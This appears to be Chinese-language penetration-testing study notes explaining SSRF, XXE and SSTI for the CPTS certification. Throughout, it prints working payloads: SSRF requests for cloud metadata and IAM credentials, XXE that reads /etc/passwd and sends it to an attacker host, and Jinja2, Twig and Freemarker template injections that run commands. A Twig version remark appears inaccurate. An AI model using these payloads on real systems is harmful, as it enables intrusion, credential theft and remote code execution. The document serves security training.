# 第 42 章 - SSRF、XXE 與 SSTI

## 標籤

- #cpts
- #chapter
- #web
- #ssrf
- #xxe
- #ssti

## 學習目標

- 能識別 SSRF、XXE、SSTI 的觸發條件與輸入點。
- 掌握各類型的基本確認與利用 payload。
- 知道如何用 SSRF 探測內網及 AWS metadata。
- 能用 SSTI 的計算回顯確認模板引擎類型並執行命令。

---

## 理論基礎：三類攻擊的共同點

| 類型 | 輸入進入 | 驗證方式 | 最高影響 |
|------|----------|----------|----------|
| SSRF | 伺服器端 HTTP 請求 | 外部 DNS/HTTP callback | 內網存取、RCE via 內部服務 |
| XXE | XML Parser 實體處理 | 讀取檔案回顯 | 讀任意檔案、SSRF via XML |
| SSTI | 模板引擎執行 | 數學計算回顯（7*7=49）| RCE |

---

## SSRF（Server-Side Request Forgery）

### 識別 SSRF 輸入點

```
常見觸發點：
- ?url=https://...（URL 抓取）
- ?img=http://...（圖片載入）
- Webhook URL 設定
- PDF/截圖產生（頁面 URL 參數）
- 文件匯入（填 URL）
- SSO redirect_uri
```

### 基本確認（DNS Callback）

```bash
# 用 Burp Collaborator 或 interactsh 產生唯一 URL
# 在 Burp → Collaborator → Copy to clipboard → 取得 xxxx.burpcollaborator.net

# 送出 payload
curl -X POST http://TARGET/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://xxxx.burpcollaborator.net"}'
# 若 Collaborator 收到 DNS/HTTP → SSRF 確認

# interactsh（開源替代）
interactsh-client      # 取得唯一子網域
# 注入：{"url":"http://xxxx.interactsh.com"}
```

### 內網探測

```bash
# 探測 localhost 服務
curl -X POST http://TARGET/api/fetch \
  -d '{"url":"http://127.0.0.1:80/"}'
# 看回應內容 → 內部服務的頁面

# 掃內網 Port（盲注需觀察時間差）
for port in 22 80 443 3306 8080 8443; do
  echo "Testing port $port"
  curl -s -X POST http://TARGET/api/fetch \
    -d "{\"url\":\"http://127.0.0.1:$port/\"}" --max-time 2
done

# 讀取 AWS EC2 Metadata（雲端環境）
curl -X POST http://TARGET/api/fetch \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
# 169.254.169.254 → AWS instance metadata IP（固定）

# 取得 IAM 憑證
curl -X POST http://TARGET/api/fetch \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# 若有 IAM role → 再請求 role 名稱取得 token

# GCP Metadata
curl -X POST http://TARGET/api/fetch \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}' \
  -H "Metadata-Flavor: Google"
# GCP 需要額外 Header

# 繞過過濾（IP 表示方式）
# http://127.0.0.1 → http://0x7f000001（十六進位）
# http://127.0.0.1 → http://2130706433（十進位）
# http://127.0.0.1 → http://127.1（省略版）
# http://127.0.0.1 → http://localhost
```

---

## XXE（XML External Entity）

### 識別 XXE 輸入點

```
常見觸發點：
- XML API（Content-Type: application/xml）
- SOAP 服務
- SVG 上傳
- Office 文件上傳（docx/xlsx 本質是 XML）
- RSS/Atom feed 處理
```

### 基本確認（讀取 /etc/passwd）

```xml
<!-- 在 XML body 中加入 DOCTYPE 宣告 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

```bash
# curl 送 XXE payload
curl -X POST http://TARGET/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
# 若回應包含 /etc/passwd 內容 → XXE 確認
```

### 盲注 XXE（Out-of-Band）

```xml
<!-- 讀取檔案後透過 HTTP 外帶 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>
```

```xml
<!-- 攻擊機 evil.dtd 內容 -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%all;
```

```bash
# 攻擊機開 HTTP Server 接收外洩資料
python3 -m http.server 80
# 收到請求：GET /?data=root:x:0:0:root:/root:/bin/bash...
```

### XXE via SSRF（訪問內網）

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://192.168.1.10:8080/admin">
]>
<root><data>&xxe;</data></root>
<!-- 用 XXE 實體發出 HTTP 請求（類似 SSRF）-->
```

---

## SSTI（Server-Side Template Injection）

### 識別 SSTI 輸入點

```
常見觸發點：
- ?name=John（頁面有 Hello John 回顯）
- 郵件模板、歡迎訊息
- 錯誤頁面中含使用者輸入
- 報表或 PDF 產生器
```

### 確認注入（計算回顯法）

```bash
# 送入計算式，看是否被執行（不同引擎語法不同）
# Jinja2 / Twig / Freemarker
curl "http://TARGET/page?name={{7*7}}"
# 若頁面顯示 49 → SSTI 確認（Jinja2/Twig）

# Mako / Pebble
curl "http://TARGET/page?name=${7*7}"
# 若顯示 49 → SSTI（Mako/Pebble/JSP EL）

# Ruby ERB
curl "http://TARGET/page?name=<%=7*7%>"
# 若顯示 49 → ERB SSTI

# Smarty
curl "http://TARGET/page?name={7*7}"
# 若顯示 49 → Smarty SSTI

# 多引擎探測順序（依回應推斷引擎）
# {{7*7}} → 49 且 {{7*'7'}} → 7777777 → Jinja2
# {{7*7}} → 49 且 {{7*'7'}} → 49 → Twig
```

### Jinja2 RCE

```bash
# Jinja2 讀取檔案
curl "http://TARGET/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# config → Flask 的 config 物件
# __class__.__init__.__globals__ → 取得全域命名空間
# os.popen('id').read() → 執行 id 命令並讀取輸出

# 更穩定的 Jinja2 RCE
curl "http://TARGET/page?name={{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['os'].popen('id').read()}}"
# N 需要找到 subprocess.Popen 或 os._wrap_close 對應的 index

# 簡化版（常用）
curl "http://TARGET/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
# request.application → Flask request 物件的 app 屬性

# URL 編碼（payload 中含特殊符號時）
# {{ → %7B%7B，}} → %7D%7D
python3 -c "import urllib.parse; print(urllib.parse.quote('{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'))"
```

### Twig RCE

```bash
# Twig（PHP）
curl "http://TARGET/page?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
# Twig 7.x+ 版本通常已修補
```

### Freemarker RCE（Java）

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## SSTI 引擎識別決策樹

```
輸入 {{7*7}}
    ├─ 回顯 49 → Jinja2 或 Twig
    │   輸入 {{7*'7'}}
    │   ├─ 49 → Twig
    │   └─ 7777777 → Jinja2
    ├─ 回顯 ${7*7} → 不是模板（可能是文字回顯）
    └─ 回顯 49 用 ${} → Mako/Pebble/Freemarker
```

---

## 速查表

```bash
# SSRF 確認
curl -d '{"url":"http://xxxx.burpcollaborator.net"}' http://TARGET/api/

# SSRF AWS Metadata
curl -d '{"url":"http://169.254.169.254/latest/meta-data/"}' http://TARGET/api/

# XXE 讀檔
# POST XML：<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...<data>&xxe;</data>

# SSTI 確認（Jinja2/Twig）
curl "http://TARGET/page?name={{7*7}}"

# Jinja2 RCE
curl "http://TARGET/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

---

## 關聯筆記

- [[36-Web請求分析|第 36 章 - Web 請求分析]]
- [[41-命令注入|第 41 章 - 命令注入]]
- [[04-Volume-4-Web-Index|Vol.4 - Web Information Gathering and Attacks]]
